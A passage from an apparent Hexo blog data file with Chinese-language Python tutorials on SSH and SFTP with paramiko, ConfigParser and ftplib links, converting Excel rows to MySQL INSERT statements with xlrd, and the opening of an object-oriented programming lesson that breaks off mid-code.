class=\"line\">#用户名和密码</span><br><span class=\"line\">USER = &apos;root&apos;</span><br><span class=\"line\">PASSWORD = &apos;000000&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">#要更新的文件和路径</span><br><span class=\"line\">file_update = &apos;textchat.js&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">cmd_mk = &apos;mkdir hq01&apos;</span><br><span class=\"line\">cmd_rm = &apos;rm -r hq02&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">IP = &apos;192.168.207.132&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">s = paramiko.SSHClient()</span><br><span class=\"line\">s.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class=\"line\">s.connect(hostname=IP, username=USER, password=PASSWORD)</span><br><span class=\"line\"></span><br><span class=\"line\">out_rm = s.exec_command(cmd_rm)</span><br><span class=\"line\">out_mk = s.exec_command(cmd_mk)</span><br><span class=\"line\"></span><br><span class=\"line\">s.close</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">REMORE_PATH = &apos;/root/hq01/get.py&apos;</span><br><span class=\"line\">LOCAL_PATH = &apos;get.py&apos;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">t = paramiko.Transport((IP,22))</span><br><span class=\"line\">t.connect(username=USER,password=PASSWORD)</span><br><span class=\"line\">s = paramiko.SFTPClient.from_transport(t)</span><br><span class=\"line\">s.put(LOCAL_PATH,REMORE_PATH)</span><br><span class=\"line\">t.close</span><br></pre></td></tr></table></figure>\n<h4 id=\"2-Python库：ConfigParser\"><a href=\"#2-Python库：ConfigParser\" class=\"headerlink\" title=\"2.Python库：ConfigParser\"></a>2.Python库：ConfigParser</h4><p>用于读取配置文件（方便配置） </p>\n<p><a href=\"http://www.pythontab.com/html/2014/pythonhexinbiancheng_1120/919.html\" target=\"_blank\" rel=\"noopener\">使用示例</a></p>\n<h4 id=\"3-Python库-ftplib-自带\"><a href=\"#3-Python库-ftplib-自带\" class=\"headerlink\" title=\"3.Python库 ftplib(自带)\"></a>3.Python库 ftplib(自带)</h4><p>用于实现ftp客户端</p>\n<p><a href=\"http://www.cnblogs.com/kaituorensheng/p/4480512.html\" target=\"_blank\" rel=\"noopener\">使用示例</a></p>\n<p>  <a href=\"http://www.cnblogs.com/luoxn28/p/5585458.html\" target=\"_blank\" rel=\"noopener\">ftp 详解</a></p>\n<p>  Linux中ftp的使用</p>\n<p>  <a href=\"http://www.linuxidc.com/Linux/2015-12/126357.htm\" target=\"_blank\" rel=\"noopener\">链接</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"Python-连接远程服务器\"><a href=\"#Python-连接远程服务器\" class=\"headerlink\" title=\"Python 连接远程服务器\"></a>Python 连接远程服务器</h2><h4 id=\"1-Python库：paramiko\"><a href=\"#1-Python库：paramiko\" class=\"headerlink\" title=\"1.Python库：paramiko\"></a>1.Python库：paramiko</h4><p>  用来通过ssh协议连接远程服务器</p>\n<p> <a href=\"http://docs.paramiko.org/en/2.1/api/proxy.html\" target=\"_blank\" rel=\"noopener\"> githuB文档</a></p>\n<p>  <a href=\"http://www.tuicool.com/articles/e2EFzy\" target=\"_blank\" rel=\"noopener\">使用示例</a></p>\n<p>  <a href=\"http://www.ruanyifeng.com/blog/2011/12/ssh_remote_login.html\" target=\"_blank\" rel=\"noopener\">ssh详解</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import paramiko</span><br><span class=\"line\"></span><br><span class=\"line\">#用户名和密码</span><br><span class=\"line\">USER = &apos;root&apos;</span><br><span class=\"line\">PASSWORD = &apos;000000&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">#要更新的文件和路径</span><br><span class=\"line\">file_update = &apos;textchat.js&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">cmd_mk = &apos;mkdir hq01&apos;</span><br><span class=\"line\">cmd_rm = &apos;rm -r hq02&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">IP = &apos;192.168.207.132&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">s = paramiko.SSHClient()</span><br><span class=\"line\">s.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class=\"line\">s.connect(hostname=IP, username=USER, password=PASSWORD)</span><br><span class=\"line\"></span><br><span class=\"line\">out_rm = s.exec_command(cmd_rm)</span><br><span class=\"line\">out_mk = s.exec_command(cmd_mk)</span><br><span class=\"line\"></span><br><span class=\"line\">s.close</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">REMORE_PATH = &apos;/root/hq01/get.py&apos;</span><br><span class=\"line\">LOCAL_PATH = &apos;get.py&apos;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">t = paramiko.Transport((IP,22))</span><br><span class=\"line\">t.connect(username=USER,password=PASSWORD)</span><br><span class=\"line\">s = paramiko.SFTPClient.from_transport(t)</span><br><span class=\"line\">s.put(LOCAL_PATH,REMORE_PATH)</span><br><span class=\"line\">t.close</span><br></pre></td></tr></table></figure>\n<h4 id=\"2-Python库：ConfigParser\"><a href=\"#2-Python库：ConfigParser\" class=\"headerlink\" title=\"2.Python库：ConfigParser\"></a>2.Python库：ConfigParser</h4><p>用于读取配置文件（方便配置） </p>\n<p><a href=\"http://www.pythontab.com/html/2014/pythonhexinbiancheng_1120/919.html\" target=\"_blank\" rel=\"noopener\">使用示例</a></p>\n<h4 id=\"3-Python库-ftplib-自带\"><a href=\"#3-Python库-ftplib-自带\" class=\"headerlink\" title=\"3.Python库 ftplib(自带)\"></a>3.Python库 ftplib(自带)</h4><p>用于实现ftp客户端</p>\n<p><a href=\"http://www.cnblogs.com/kaituorensheng/p/4480512.html\" target=\"_blank\" rel=\"noopener\">使用示例</a></p>\n<p>  <a href=\"http://www.cnblogs.com/luoxn28/p/5585458.html\" target=\"_blank\" rel=\"noopener\">ftp 详解</a></p>\n<p>  Linux中ftp的使用</p>\n<p>  <a href=\"http://www.linuxidc.com/Linux/2015-12/126357.htm\" target=\"_blank\" rel=\"noopener\">链接</a></p>\n"},{"title":"Python操作excel","date":"2018-07-10T13:09:19.000Z","_content":"#### 1.使用的库\n> xlrd  库 ==读文件==\n\n> xlwt  库 ==写文件==\n\n[官网地址](http://pypi.python.org/pypi/xlrd)\n\n可以操作的文件：.xls or .xlsx 文件\n\n#### 2.用法\n安装：\n> pip install 模块\n\n###### xlrd使用：\n\n0. 打开文件\n```\ndata = xlrd.open_workbook('文件.xlsx')\n```\n\n1. 获取excel的sheet,返回一个数组，每个元素都是一个sheet\n```\nsheet = data.sheets()\n```\n2. 获取表单\n```\ntable = sheet[0]\n```\n3. 获取行的数量和列的数量\n```\nrowcount = table.nrows\ncolcount = table.ncols\n```\n4. 获取一行或一列的内容，返回一个数组。每个元素为一个单元格内容\n```\nrow_values = table.row_values(i)  # i 为行数 \ncol_value = table.col_values(i)   # i 为列数\n```\n###### xlwd使用\n\n[官网链接](https://github.com/python-excel/xlwt/tree/master/examples)\n\n1. 使用 ==待更新==\n#### 3.栗子\n把一个excel里的数据导出成MySQL的insert语句\n```\nimport xlrd\n\ndata = xlrd.open_workbook('data.xlsx')\ntable = data.sheets()[0]\n\ntable_name = \"HSDATA.ASSET\"\nrowcount = table.nrows\ncloum_names = table.row_values(1)\n\nnames_str = \"INIT_DATE, FUND_ACCOUNT, MONEY_TYPE, TOTAL_ASSET, FUND_ASSET, SECU_MARKET_VALUE, OPFUND_MARKET_VALUE\"\nvalues_str = \"\"\n\nfor i in range(2,rowcount):\n    cloum_values = table.row_values(i)\n    index = 0\n    for value in cloum_values:\n        if(index == 0):\n            values_str = values_str+str(int(value))+\",\"\n        if(index == 1):\n            values_str = values_str+\"\\'hq\\',\"\n        if(index == 2):\n            values_str = values_str+\"\\'\"+str(value)+\"\\',\"\n        if(index == 3):\n            values_str = values_str+str(value)+\",\"\n        if(index == 4):\n            values_str = values_str+str(value)+\",\"\n        if(index == 5):\n            values_str = values_str+str(int(value))+\",\"\n        if(index == 6):\n            values_str = values_str+str(value)\n        index = index + 1\n\n    sql = \"INSERT INTO \"+table_name+\"(\"+names_str+\")VALUES(\"+values_str+\");\"\n    values_str = \"\"\n    print (sql)\n```","source":"_posts/python/Python操作excel.md","raw":"---\ntitle: Python操作excel\ndate: 2018-07-10 21:09:19\ntags: python\n---\n#### 1.使用的库\n> xlrd  库 ==读文件==\n\n> xlwt  库 ==写文件==\n\n[官网地址](http://pypi.python.org/pypi/xlrd)\n\n可以操作的文件：.xls or .xlsx 文件\n\n#### 2.用法\n安装：\n> pip install 模块\n\n###### xlrd使用：\n\n0. 打开文件\n```\ndata = xlrd.open_workbook('文件.xlsx')\n```\n\n1. 获取excel的sheet,返回一个数组，每个元素都是一个sheet\n```\nsheet = data.sheets()\n```\n2. 获取表单\n```\ntable = sheet[0]\n```\n3. 获取行的数量和列的数量\n```\nrowcount = table.nrows\ncolcount = table.ncols\n```\n4. 获取一行或一列的内容，返回一个数组。每个元素为一个单元格内容\n```\nrow_values = table.row_values(i)  # i 为行数 \ncol_value = table.col_values(i)   # i 为列数\n```\n###### xlwd使用\n\n[官网链接](https://github.com/python-excel/xlwt/tree/master/examples)\n\n1. 使用 ==待更新==\n#### 3.栗子\n把一个excel里的数据导出成MySQL的insert语句\n```\nimport xlrd\n\ndata = xlrd.open_workbook('data.xlsx')\ntable = data.sheets()[0]\n\ntable_name = \"HSDATA.ASSET\"\nrowcount = table.nrows\ncloum_names = table.row_values(1)\n\nnames_str = \"INIT_DATE, FUND_ACCOUNT, MONEY_TYPE, TOTAL_ASSET, FUND_ASSET, SECU_MARKET_VALUE, OPFUND_MARKET_VALUE\"\nvalues_str = \"\"\n\nfor i in range(2,rowcount):\n    cloum_values = table.row_values(i)\n    index = 0\n    for value in cloum_values:\n        if(index == 0):\n            values_str = values_str+str(int(value))+\",\"\n        if(index == 1):\n            values_str = values_str+\"\\'hq\\',\"\n        if(index == 2):\n            values_str = values_str+\"\\'\"+str(value)+\"\\',\"\n        if(index == 3):\n            values_str = values_str+str(value)+\",\"\n        if(index == 4):\n            values_str = values_str+str(value)+\",\"\n        if(index == 5):\n            values_str = values_str+str(int(value))+\",\"\n        if(index == 6):\n            values_str = values_str+str(value)\n        index = index + 1\n\n    sql = \"INSERT INTO \"+table_name+\"(\"+names_str+\")VALUES(\"+values_str+\");\"\n    values_str = \"\"\n    print (sql)\n```","slug":"python/Python操作excel","published":1,"updated":"2018-07-10T13:10:09.960Z","_id":"cjjedmhb700670gtj2fjtm52k","comments":1,"layout":"post","photos":[],"link":"","content":"<h4 id=\"1-使用的库\"><a href=\"#1-使用的库\" class=\"headerlink\" title=\"1.使用的库\"></a>1.使用的库</h4><blockquote>\n<p>xlrd  库 ==读文件==</p>\n</blockquote>\n<blockquote>\n<p>xlwt  库 ==写文件==</p>\n</blockquote>\n<p><a href=\"http://pypi.python.org/pypi/xlrd\" target=\"_blank\" rel=\"noopener\">官网地址</a></p>\n<p>可以操作的文件：.xls or .xlsx 文件</p>\n<h4 id=\"2-用法\"><a href=\"#2-用法\" class=\"headerlink\" title=\"2.用法\"></a>2.用法</h4><p>安装：</p>\n<blockquote>\n<p>pip install 模块</p>\n</blockquote>\n<h6 id=\"xlrd使用：\"><a href=\"#xlrd使用：\" class=\"headerlink\" title=\"xlrd使用：\"></a>xlrd使用：</h6><ol start=\"0\">\n<li><p>打开文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">data = xlrd.open_workbook(&apos;文件.xlsx&apos;)</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>获取excel的sheet,返回一个数组，每个元素都是一个sheet</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sheet = data.sheets()</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>获取表单</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">table = sheet[0]</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>获取行的数量和列的数量</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rowcount = table.nrows</span><br><span class=\"line\">colcount = table.ncols</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>获取一行或一列的内容，返回一个数组。每个元素为一个单元格内容</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">row_values = table.row_values(i)  # i 为行数 </span><br><span class=\"line\">col_value = table.col_values(i)   # i 为列数</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h6 id=\"xlwd使用\"><a href=\"#xlwd使用\" class=\"headerlink\" title=\"xlwd使用\"></a>xlwd使用</h6><p><a href=\"https://github.com/python-excel/xlwt/tree/master/examples\" target=\"_blank\" rel=\"noopener\">官网链接</a></p>\n<ol>\n<li>使用 ==待更新==<h4 id=\"3-栗子\"><a href=\"#3-栗子\" class=\"headerlink\" title=\"3.栗子\"></a>3.栗子</h4>把一个excel里的数据导出成MySQL的insert语句<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import xlrd</span><br><span class=\"line\"></span><br><span class=\"line\">data = xlrd.open_workbook(&apos;data.xlsx&apos;)</span><br><span class=\"line\">table = data.sheets()[0]</span><br><span class=\"line\"></span><br><span class=\"line\">table_name = &quot;HSDATA.ASSET&quot;</span><br><span class=\"line\">rowcount = table.nrows</span><br><span class=\"line\">cloum_names = table.row_values(1)</span><br><span class=\"line\"></span><br><span class=\"line\">names_str = &quot;INIT_DATE, FUND_ACCOUNT, MONEY_TYPE, TOTAL_ASSET, FUND_ASSET, SECU_MARKET_VALUE, OPFUND_MARKET_VALUE&quot;</span><br><span class=\"line\">values_str = &quot;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">for i in range(2,rowcount):</span><br><span class=\"line\">    cloum_values = table.row_values(i)</span><br><span class=\"line\">    index = 0</span><br><span class=\"line\">    for value in cloum_values:</span><br><span class=\"line\">        if(index == 0):</span><br><span class=\"line\">            values_str = values_str+str(int(value))+&quot;,&quot;</span><br><span class=\"line\">        if(index == 1):</span><br><span class=\"line\">            values_str = values_str+&quot;\\&apos;hq\\&apos;,&quot;</span><br><span class=\"line\">        if(index == 2):</span><br><span class=\"line\">            values_str = values_str+&quot;\\&apos;&quot;+str(value)+&quot;\\&apos;,&quot;</span><br><span class=\"line\">        if(index == 3):</span><br><span class=\"line\">            values_str = values_str+str(value)+&quot;,&quot;</span><br><span class=\"line\">        if(index == 4):</span><br><span class=\"line\">            values_str = values_str+str(value)+&quot;,&quot;</span><br><span class=\"line\">        if(index == 5):</span><br><span class=\"line\">            values_str = values_str+str(int(value))+&quot;,&quot;</span><br><span class=\"line\">        if(index == 6):</span><br><span class=\"line\">            values_str = values_str+str(value)</span><br><span class=\"line\">        index = index + 1</span><br><span class=\"line\"></span><br><span class=\"line\">    sql = &quot;INSERT INTO &quot;+table_name+&quot;(&quot;+names_str+&quot;)VALUES(&quot;+values_str+&quot;);&quot;</span><br><span class=\"line\">    values_str = &quot;&quot;</span><br><span class=\"line\">    print (sql)</span><br></pre></td></tr></table></figure></li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"1-使用的库\"><a href=\"#1-使用的库\" class=\"headerlink\" title=\"1.使用的库\"></a>1.使用的库</h4><blockquote>\n<p>xlrd  库 ==读文件==</p>\n</blockquote>\n<blockquote>\n<p>xlwt  库 ==写文件==</p>\n</blockquote>\n<p><a href=\"http://pypi.python.org/pypi/xlrd\" target=\"_blank\" rel=\"noopener\">官网地址</a></p>\n<p>可以操作的文件：.xls or .xlsx 文件</p>\n<h4 id=\"2-用法\"><a href=\"#2-用法\" class=\"headerlink\" title=\"2.用法\"></a>2.用法</h4><p>安装：</p>\n<blockquote>\n<p>pip install 模块</p>\n</blockquote>\n<h6 id=\"xlrd使用：\"><a href=\"#xlrd使用：\" class=\"headerlink\" title=\"xlrd使用：\"></a>xlrd使用：</h6><ol start=\"0\">\n<li><p>打开文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">data = xlrd.open_workbook(&apos;文件.xlsx&apos;)</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>获取excel的sheet,返回一个数组，每个元素都是一个sheet</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sheet = data.sheets()</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>获取表单</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">table = sheet[0]</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>获取行的数量和列的数量</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rowcount = table.nrows</span><br><span class=\"line\">colcount = table.ncols</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>获取一行或一列的内容，返回一个数组。每个元素为一个单元格内容</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">row_values = table.row_values(i)  # i 为行数 </span><br><span class=\"line\">col_value = table.col_values(i)   # i 为列数</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h6 id=\"xlwd使用\"><a href=\"#xlwd使用\" class=\"headerlink\" title=\"xlwd使用\"></a>xlwd使用</h6><p><a href=\"https://github.com/python-excel/xlwt/tree/master/examples\" target=\"_blank\" rel=\"noopener\">官网链接</a></p>\n<ol>\n<li>使用 ==待更新==<h4 id=\"3-栗子\"><a href=\"#3-栗子\" class=\"headerlink\" title=\"3.栗子\"></a>3.栗子</h4>把一个excel里的数据导出成MySQL的insert语句<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import xlrd</span><br><span class=\"line\"></span><br><span class=\"line\">data = xlrd.open_workbook(&apos;data.xlsx&apos;)</span><br><span class=\"line\">table = data.sheets()[0]</span><br><span class=\"line\"></span><br><span class=\"line\">table_name = &quot;HSDATA.ASSET&quot;</span><br><span class=\"line\">rowcount = table.nrows</span><br><span class=\"line\">cloum_names = table.row_values(1)</span><br><span class=\"line\"></span><br><span class=\"line\">names_str = &quot;INIT_DATE, FUND_ACCOUNT, MONEY_TYPE, TOTAL_ASSET, FUND_ASSET, SECU_MARKET_VALUE, OPFUND_MARKET_VALUE&quot;</span><br><span class=\"line\">values_str = &quot;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">for i in range(2,rowcount):</span><br><span class=\"line\">    cloum_values = table.row_values(i)</span><br><span class=\"line\">    index = 0</span><br><span class=\"line\">    for value in cloum_values:</span><br><span class=\"line\">        if(index == 0):</span><br><span class=\"line\">            values_str = values_str+str(int(value))+&quot;,&quot;</span><br><span class=\"line\">        if(index == 1):</span><br><span class=\"line\">            values_str = values_str+&quot;\\&apos;hq\\&apos;,&quot;</span><br><span class=\"line\">        if(index == 2):</span><br><span class=\"line\">            values_str = values_str+&quot;\\&apos;&quot;+str(value)+&quot;\\&apos;,&quot;</span><br><span class=\"line\">        if(index == 3):</span><br><span class=\"line\">            values_str = values_str+str(value)+&quot;,&quot;</span><br><span class=\"line\">        if(index == 4):</span><br><span class=\"line\">            values_str = values_str+str(value)+&quot;,&quot;</span><br><span class=\"line\">        if(index == 5):</span><br><span class=\"line\">            values_str = values_str+str(int(value))+&quot;,&quot;</span><br><span class=\"line\">        if(index == 6):</span><br><span class=\"line\">            values_str = values_str+str(value)</span><br><span class=\"line\">        index = index + 1</span><br><span class=\"line\"></span><br><span class=\"line\">    sql = &quot;INSERT INTO &quot;+table_name+&quot;(&quot;+names_str+&quot;)VALUES(&quot;+values_str+&quot;);&quot;</span><br><span class=\"line\">    values_str = &quot;&quot;</span><br><span class=\"line\">    print (sql)</span><br></pre></td></tr></table></figure></li>\n</ol>\n"},{"title":"Python面向对象","date":"2018-07-10T13:09:19.000Z","_content":"```\r\nPython从设计之初就已经是一门面向对象的语言，正因为如此，在Python中创建一个类和对象是很容易的。本章节我们将详细介绍Python的面向对象编程。\r\n如果你以前没有接触过面向对象的编程语言，那你可能需要先了解一些面向对象语言的一些基本特征，在头脑里头形成一个基本的面向对象的概念，这样有助于你更容易的学习Python的面向对象编程。\r\n接下来我们先来简单的了解下面向对象的一些基本特征。\r\n面向对象技术简介\r\n类(Class): 用来描述具有相同的属性和方法的对象的集合。它定义了该集合中每个对象所共有的属性和方法。对象是类的实例。\r\n类变量：类变量在整个实例化的对象中是公用的。类变量定义在类中且在函数体之外。类变量通常不作为实例变量使用。\r\n数据成员：类变量或者实例变量用于处理类及其实例对象的相关的数据。\r\n方法重写：如果从父类继承的方法不能满足子类的需求，可以对其进行改写，这个过程叫方法的覆盖（override），也称为方法的重写。\r\n实例变量：定义在方法中的变量，只作用于当前实例的类。\r\n继承：即一个派生类（derived class）继承基类（base class）的字段和方法。继承也允许把一个派生类的对象作为一个基类对象对待。例如，有这样一个设计：一个Dog类型的对象派生自Animal类，这是模拟\"是一个（is-a）\"关系（例图，Dog是一个Animal）。\r\n实例化：创建一个类的实例，类的具体对象。\r\n方法：类中定义的函数。\r\n对象：通过类定义的数据结构实例。对象包括两个数据成员（类变量和实例变量）和方法。\r\n创建类\r\n使用class语句来创建一个新类，class之后为类的名称并以冒号结尾，如下实例:\r\nclass ClassName:\r\n   '类的帮助信息'   #类文档字符串\r\n   class_suite  #类体\r\n类的帮助信息可以通过ClassName.__doc__查看。\r\nclass_suite 由类成员，方法，数据属性组成。\r\n实例\r\n以下是一个简单的Python类实例:\r\n实例\r\n#!/usr/bin/python\r\n\r\n# -*- coding: UTF-8 -*-\r\n \r\nclass Employee:\r\n   '所有员工的基类'\r\n   empCount = 0\r\n \r\n   def __init__(self, name, salary):\r\n      self.name = name\r\n      self.salary = salary\r\n      Employee.empCount += 1\r\n   \r\n   def displayCount(self):\r\n     print \"Total Employee %d\" % Employee.empCount\r\n \r\n   def displayEmployee(self):\r\n      print \"Name : \", self.name,  \", Salary: \", self.salary\r\n      \r\nempCount 变量是一个类变量，它的值将在这个类的所有实例之间共享。你可以在内部类或外部类使用 Employee.empCount 访问。\r\n第一种方法__init__()方法是一种特殊的方法，被称为类的构造函数或初始化方法，当创建了这个类的实例时就会调用该方法\r\nself 代表类的实例，self 在定义类的方法时是必须有的，虽然在调用时不必传入相应的参数。\r\nself代表类的实例，而非类\r\n类的方法与普通的函数只有一个特别的区别——它们必须有一个额外的第一个参数名称, 按照惯例它的名称是 self。\r\nclass Test:\r\n    def prt(self):\r\n        print(self)\r\n        print(self.__class__)\r\n \r\nt = Test()\r\nt.prt()\r\n以上实例执行结果为：\r\n<__main__.Test instance at 0x10d066878>\r\n__main__.Test\r\n从执行结果可以很明显的看出，self 代表的是类的实例，代表当前对象的地址，而 self.class 则指向类。\r\nself 不是 python 关键字，我们把他换成 runoob 也是可以正常执行的:\r\n实例\r\nclass Test:\r\n    def prt(runoob):\r\n        print(runoob)\r\n        print(runoob.__class__)\r\n \r\nt = Test()\r\nt.prt()\r\n以上实例执行结果为：\r\n<__main__.Test instance at 0x10d066878>\r\n__main__.Test\r\n创建实例对象\r\n实例化类其他编程语言中一般用关键字 new，但是在 Python 中并没有这个关键字，类的实例化类似函数调用方式。\r\n以下使用类的名称 Employee 来实例化，并通过 __init__ 方法接受参数。\r\n\"创建 Employee 类的第一个对象\"\r\nemp1 = Employee(\"Zara\", 2000)\r\n\"创建 Employee 类的第二个对象\"\r\nemp2 = Employee(\"Manni\", 5000)\r\n访问属性\r\n您可以使用点(.)来访问对象的属性。使用如下类的名称访问类变量:\r\nemp1.displayEmployee()\r\nemp2.displayEmployee()\r\nprint \"Total Employee %d\" % Employee.empCount\r\n完整实例：\r\n实例\r\n#!/usr/bin/python\r\n# -*- coding: UTF-8 -*-\r\n \r\nclass Employee:\r\n   '所有员工的基类'\r\n   empCount = 0\r\n \r\n   def __init__(self, name, salary):\r\n      self.name = name\r\n      self.salary = salary\r\n      Employee.empCount += 1\r\n   \r\n   def displayCount(self):\r\n     print \"Total Employee %d\" % Employee.empCount\r\n \r\n   def displayEmployee(self):\r\n      print \"Name : \", self.name,  \", Salary: \", self.salary\r\n \r\n\"创建 Employee 类的第一个对象\"\r\nemp1 = Employee(\"Zara\", 2000)\r\n\"创建 Employee 类的第二个对象\"\r\nemp2 = Employee(\"Manni\", 5000)\r\nemp1.displayEmployee()\r\nemp2.displayEmployee()\r\nprint \"Total Employee %d\" % Employee.empCount\r\n执行以上代码输出结果如下：\r\nName :  Zara ,Salary:  2000\r\nName :  Manni ,Salary:  5000\r\nTotal Employee 2\r\n你可以添加，删除，修改类的属性，如下所示：\r\nemp1.age = 7  # 添加一个 'age' 属性\r\nemp1.age = 8  # 修改 'age' 属性\r\ndel emp1.age  # 删除 'age' 属性\r\n你也可以使用以下函数的方式来访问属性：\r\ngetattr(obj, name[, default]) : 访问对象的属性。\r\nhasattr(obj,name) : 检查是否存在一个属性。\r\nsetattr(obj,name,value) : 设置一个属性。如果属性不存在，会创建一个新属性。\r\ndelattr(obj, name) : 删除属性。\r\nhasattr(emp1, 'age')    # 如果存在 'age' 属性返回 True。\r\ngetattr(emp1, 'age')    # 返回 'age' 属性的值\r\nsetattr(emp1, 'age', 8) # 添加属性 'age' 值为 8\r\ndelattr(empl, 'age')    # 删除属性 'age'\r\nPython内置类属性\r\n__dict__ : 类的属性（包含一个字典，由类的数据属性组成）\r\n__doc__ :类的文档字符串\r\n__name__: 类名\r\n__module__: 类定义所在的模块（类的全名是'__main__.className'，如果类位于一个导入模块mymod中，那么className.__module__ 等于 mymod）\r\n__bases__ : 类的所有父类构成元素（包含了一个由所有父类组成的元组）\r\nPython内置类属性调用实例如下：\r\n实例\r\n#!/usr/bin/python\r\n# -*- coding: UTF-8 -*-\r\n \r\nclass Employee:\r\n   '所有员工的基类'\r\n   empCount = 0\r\n \r\n   def __init__(self, name, salary):\r\n      self.name = name\r\n      self.salary = salary\r\n      Employee.empCount += 1\r\n   \r\n   def displayCount(self):\r\n     print \"Total Employee %d\" % 